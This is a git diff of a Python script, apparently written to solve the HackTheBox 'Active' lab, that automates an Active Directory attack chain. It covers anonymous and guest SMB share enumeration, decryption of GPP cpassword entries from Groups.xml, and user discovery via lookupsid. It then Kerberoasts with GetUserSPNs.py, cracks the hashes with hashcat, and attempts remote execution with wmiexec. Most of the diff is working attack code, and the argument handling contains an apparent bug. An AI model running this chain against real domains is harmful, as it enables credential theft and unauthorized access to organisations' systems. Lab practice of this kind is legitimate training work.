@@ -2,10 +2,11 @@ import time
 import coloredlogs, logging
 import argparse
 from io import BytesIO
+from os import path
 import subprocess
 
 from impacket.smbconnection import SMBConnection, SessionError
-from tempfile import mkdtemp, mkstemp
+from tempfile import mkdtemp, mkstemp, gettempdir
 from gitleaks_py import gitleaks_command as gl_c, gitleaks_model as gl_m
 import requests
 from defusedxml import ElementTree
@@ -13,6 +14,10 @@ from Crypto.Cipher import AES
 import base64
 
 import ldap3
+import magic
+import zipfile
+
+import re
 
 # https://app.hackthebox.com/machines/Active
 
@@ -22,11 +27,20 @@ coloredlogs.install(level='DEBUG')
 
 parser = argparse.ArgumentParser(prog='WindowsSolver')
 parser.add_argument('--ip', help='target IP', required=True)
+parser.add_argument('--usernames', help='Initial list of usernames')
+parser.add_argument('--passwords', help='Initial list of passwords')
+parser.add_argument('--credentials', help='Initial list of credentials')
+parser.add_argument('--credential', help='Initial credential')
+
+hash_file_name = path.join(gettempdir(), "hash.txt")
 
 _fid, GITLEAKS_DEFAULT_CONFIG_FILE = mkstemp()
 
 with open(GITLEAKS_DEFAULT_CONFIG_FILE, "w") as cfg:
     cfg.write(requests.get(gl_m.GITLEAKS_DEFAULT_CONFIG_FILE).text)
+
+usernames = set()
+passwords = set()
 
 credentials = {}
 
@@ -55,8 +69,19 @@ def decrypt(cpass):
     aes = AES.new(key, AES.MODE_CBC, iv)
     return aes.decrypt(decoded).decode(encoding='ascii').strip()
 
-def list(share_name, path, depth):
-    tmp_dir = mkdtemp()
+def parse_groups_xml(output):
+    tree = ElementTree.fromstring(output)
+    user = tree.find('User')
+    if user is not None:
+        properties = user.find('Properties')
+        username = properties.attrib.get('userName')
+        cpass = properties.attrib.get('cpassword')
+        decrypted_pass = decrypt(cpass).encode().decode("utf-16")
+        logger.warning(f"New credentials found : {username}:{decrypted_pass}")
+        save_creds(username, decrypted_pass)
+
+def list_files_in_share(connection, share_name, path, depth):
+    tmp_dir = mkdtemp(prefix="ws_")
     for f in connection.listPath(share_name, path + "/*"):
         name = f.get_longname()
         if f.is_directory() and name in ['.', '..']:
@@ -64,43 +89,43 @@ def list(share_name, path, depth):
 
         logger.warning("  "*depth +  "%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), time.ctime(float(f.get_mtime_epoch())), name))
         if f.is_directory():
-            list(share_name, path + "/" + name, depth + 1)
+            list_files_in_share(connection, share_name, path + "/" + name, depth + 1)
         else:
             fh = BytesIO()
             connection.getFile(share_name, path + "/" + name, fh.write)
             output = fh.getvalue()
-            with open(tmp_dir + "/" + name, "wb") as f_smb:
+            current_file_name = tmp_dir + "/" + name
+            with open(current_file_name, "wb") as f_smb:
                 f_smb.write(output)
 
+            logger.debug(f"Type of {current_file_name} " + magic.from_file(tmp_dir + "/" + name))
+
             if name == "Groups.xml":
-                tree = ElementTree.fromstring(output)
-                user = tree.find('User')
-                if user is not None:
-                    properties = user.find('Properties')
-                    username = properties.attrib.get('userName')
-                    cpass = properties.attrib.get('cpassword')
-                    decrypted_pass = decrypt(cpass).encode().decode("utf-16")
-                    logger.warning(f"New credentials found : {username}:{decrypted_pass}")
-                    save_creds(username, decrypted_pass)
+                parse_groups_xml(output)
+            elif magic.from_file(current_file_name).startswith("Zip archive data"):
+                with zipfile.ZipFile(current_file_name, 'r') as zip_ref:
+                    zip_ref.extractall(current_file_name + "_extract")
+
     logger.info("Scanning " + tmp_dir)
     logger.info(gl_c.detect(GITLEAKS_DEFAULT_CONFIG_FILE, tmp_dir))
 
 
-def ldap_find_kerberoasting(ip, username, password):
+def ldap_find_kerberoasting(ip, domain, username, password):
     escaped_username = username.replace("\\", "/")
-    get_user_spns_command = ["GetUserSPNs.py", escaped_username + ":" + password, "-dc-ip", ip, "-request"]
+    get_user_spns_command = ["GetUserSPNs.py", domain + "/" + escaped_username + ":" + password, "-dc-ip", ip, "-request"]
     print(get_user_spns_command)
     result = subprocess.run(get_user_spns_command, capture_output=True, text=True, check=True)
     output = result.stdout
     
-    with open("hash.txt", "a") as hash_file:
+    # GetUserSPNs.py -outputfile /tmp/hash.txt
+    with open(hash_file_name, "a") as hash_file:
         for line in output.splitlines():
             if line.startswith("$krb5tgs$"):
                 hash_file.write(line + "\n")
 
 def crack_hashes():
     logger.warning("Hashcat in progress...")
-    hashcat_command = ["hashcat", "-a", "0", "-m", "13100", "hash.txt", "/usr/share/wordlists/rockyou.txt", "--quiet"]
+    hashcat_command = ["hashcat", "-a", "0", "-m", "13100", hash_file_name, "/usr/share/wordlists/rockyou.txt", "--quiet"]
     result = subprocess.run(hashcat_command, check=True, capture_output=True)
     output = result.stdout
     logger.info(output)
@@ -123,37 +148,91 @@ def test_wmiexec(ip, domain, username, password):
         output = result.stdout
         logger.info(output.decode())
 
-if __name__ =="__main__":
-    args = parser.parse_args()
-    ip = args.ip
-
-    query_ldap_ad(ip)
-
-    logger.warning(f"Domain: {ad_infos['domain']}")
-
+def list_shares(ip, user = "", password = ""):
     connection = SMBConnection(remoteName = ip, remoteHost = ip)
-    connection.login(user='', password='')
+    connection.login(user, password)
 
     logger.info("Listing shares")
     shares = connection.listShares()
     logger.info(f"Number of shares found: {len(shares)}")
     for s in shares:
         share_name = s.fields['shi1_netname'].fields['Data'].fields['Data'].decode("utf-16le")[:-1]
-        base_msg = " %r : " %(share_name)
+        share_comment = s.fields['shi1_remark'].fields['Data'].fields['Data'].decode("utf-16le")[:-1]
+        base_msg = " %r (%r) : " %(share_name, share_comment)
         try:
             connection.connectTree(share_name)
             logger.warning(base_msg + "Readable")
-            list(share_name, '', depth = 0)
+            list_files_in_share(connection, share_name, '', depth = 0)
         except SessionError as e:
             logger.info(base_msg + "Not readable")
             logger.debug(e)
 
+def sync_time(ip):
+    logger.info("Syncing time with target...")
+    sync_command = ["sudo", "rdate", "-vn", ip]
+    result = subprocess.run(sync_command, capture_output=True)
+    logger.debug(result.stdout.decode())
+    if result.returncode != 0:
+        logger.error("Fail to sync date with target, it might block communication with KRB service")
+        logger.error("Add '<username> ALL=(root) /usr/sbin/rdate -vn *' to /etc/sudoers to allow the script to update it automatically")
+
+def list_users(ip, domain, username, password):
+    logger.info("Listing RPC uers...")
+    regex = r".*: .*\\(.*) \((.*)\)"
+    sid_command = ["impacket-lookupsid", f"{domain}/{username}:{password}@{ip}"]
+    result = subprocess.run(sid_command, capture_output=True)
+    if result.returncode == 0:
+        output = result.stdout.decode()
+        matches = re.finditer(regex, output, re.MULTILINE)
+
+        for _matchNum, match in enumerate(matches, start=1):
+            username = match.group(1)
+            sid_type = match.group(2)
+            if sid_type == "SidTypeUser":
+                logger.info(f"New username discovered: {username}")
+                usernames.add(username)
+    else:
+        print(result)
+
+if __name__ =="__main__":
+    args = parser.parse_args()
+    ip = args.ip
+
+    if credentials in args.credentials and ":" in credentials:
+        username = credentials.split(":")[0]
+        password = ":".join(credentials.split(":")[1:])
+        save_creds(username, password)
+
+    sync_time(ip)
+
+    query_ldap_ad(ip)
+
+    domain = ad_infos['domain']
+    logger.warning(f"Domain: {domain}")
+
+
+    for username, password in [('',''), ('guest', ''), *credentials.items()]:
+        list_users(ip, domain, username, password)
+
+    for username in ['', 'guest', *usernames]:
+        try:
+            list_shares(ip, user=username, password='')
+        except:
+            logger.info(f"Unable to list SMB with {username}")
+
+    for username, password in [('',''), ('guest', ''), *credentials.items()]:
+        try:
+            list_shares(ip, user=username, password=password)
+        except:
+            logger.info(f"Unable to list SMB with {username}:{password}")
+
     for username, password in credentials.items():
-        ldap_find_kerberoasting(ip, username, password)
+        ldap_find_kerberoasting(ip, domain, username, password)
 
     crack_hashes()
 
     for username, password in credentials.items():
-        test_wmiexec(ip, ad_infos['domain'], username, password)
+        test_wmiexec(ip, domain, username, password)
+
 
 
